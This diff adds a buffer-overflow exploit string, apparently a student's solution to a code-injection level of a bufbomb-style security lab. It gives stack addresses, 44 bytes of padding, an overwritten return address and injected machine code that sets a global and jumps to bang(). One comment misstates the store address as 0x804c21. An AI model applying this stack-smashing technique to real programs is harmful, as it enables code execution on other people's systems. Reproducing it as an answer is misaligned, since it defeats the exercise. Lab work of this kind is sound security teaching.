@@ -1,0 +1,14 @@
+/* getbuf return address is located at address: 0x55683754 */
+/* bang() return address is located at address: 0x55683758 */
+/* Local buffer starts at address: 0x55683728 */
+/* Padding required: 44 Bytes(exclude 4 Bytes return address, and 4 Bytes argument) */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* offend code is located at 0x5568375c */
+5c 37 68 55
+/* bang() is located at address: 0x08048d05 */
+05 8d 04 08
+/* offend code */
+a1 20 c2 04 08 /* mov     0x804c220,%eax */
+a3 18 c2 04 08 /* mov     %eax,0x804c21 */
+c3             /* ret */
